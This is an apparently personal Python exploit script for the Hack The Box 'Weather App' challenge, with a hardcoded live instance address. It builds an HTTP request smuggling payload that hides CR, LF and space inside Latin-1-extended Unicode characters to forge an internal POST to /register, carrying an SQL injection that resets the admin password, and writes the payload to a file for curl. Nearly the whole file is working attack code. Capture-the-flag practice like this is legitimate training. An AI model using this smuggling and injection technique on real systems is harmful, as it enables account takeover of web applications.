#########################################################################################
### EXPLOIT BY ANMOL ###
### Name: Http Request Smuggling via Unicode Payload ###
#########################################################################################


# the unicode values for common control characters
# cr = '\u000D'
# lf = '\u000A'
# sp = '\u0020'
# ht = '\u0009'

# The modified control characters from LAT-1-EXT
#lat_cr = '\u010D'
#lat_lf = '\u010A'
#lat_sp = '\u0120'
#lat_ht = '\u0109'


""" HACK THE BOX - Weather App Challenge 
	HTTP Request Smuggling + SQL Injection
	17 Feb, 2023
"""

import argparse
import pyfiglet
import os

parser = argparse.ArgumentParser(description = 'Exploit HTB Weather App')
parser.add_argument('-r', dest='remote', action='store_true', help='Send payload to live instance and not localhost')


args = parser.parse_args()


#user the args to determine which server to find against

if args.remote:
	server = ' 134.209.17.36'
	port = '31787'

else:
	server = '127.0.0.1'
	port = '1337'

# Ref: https://xenome.io/http-request-smuggling-via-unicode-payloads/

# the unicode values for common characters

cr = '\u000D'
lf = '\u000A'
sp = '\u0020'
ht = '\u0009'

# the modified control characters from LAT-1-EXT
lat_cr = '\u010D'
lat_lf = '\u010A'
lat_sp = '\u0120'
lat_ht = '\u0109'
lat_amp = '\u0126'

# Entry Part
#os.system('clear')
#a = pyfiglet_figlet.format("WeatherApp Exploit")
#print(a)

# The body of the smuggled request is the SQL Injection
print("Building the SQL Injection Payload...")
payload = "') ON CONFLICT(username) DO UPDATE SET password = 'admin';--"

#encode the payload
encoded_payload = payload.replace("'", "%27").replace(' ', "%20")

# We have to use lat_amp so it smuggles through
smuggled_body = "username=admin" + lat_amp+ "password=admin" + encoded_payload
final = lat_lf + lat_lf + f"GET{lat_sp}/&country=register"

#now build the headers for the content length
# all of the control characters need to use the latin alternatives for this to work

print("Building HTTP Smuggled Request Payload")
# Stage 1 is the legitimate payload of the endpoint, then we start injecting unicode
smuggled = f"endpoint=127.0.0.1:80&city={lat_sp}"

# Stage 2 injects a keep-alive connection
smuggled += f"HTTP/1.1{lat_lf}"
smuggled += f"Host:{lat_sp}127.0.0.1:80{lat_lf}"
smuggled += f"connection:{lat_sp}keep-alive{lat_lf}{lat_lf}{lat_lf}"


# Stage 3 injects the actual post request

smuggled += f"POST{lat_sp}/register{lat_sp}HTTP/1.1{lat_lf}"
smuggled += f"HOST:{lat_sp}127.0.0.1:80{lat_lf}"
smuggled += f"Content-Type:{lat_sp}application/x-www-form-urlencoded{lat_lf}"
smuggled += f"User-Agent:{lat_sp}Mozilla/5.0{lat_lf}"
smuggled += f"Connection:{lat_sp}keep-alive{lat_lf}"
smuggled += f"Content-Length:{lat_sp}" + str(len(smuggled_body) ) + lat_lf + lat_lf


# Now we have build everyting for the payload, let's out the request to use in curl
print("Outputing to ./curl.txt")
f = open('curl.txt', 'w+')
#f.write(req1)
f.write(smuggled)
f.write(smuggled_body)
f.write(final)
f.close()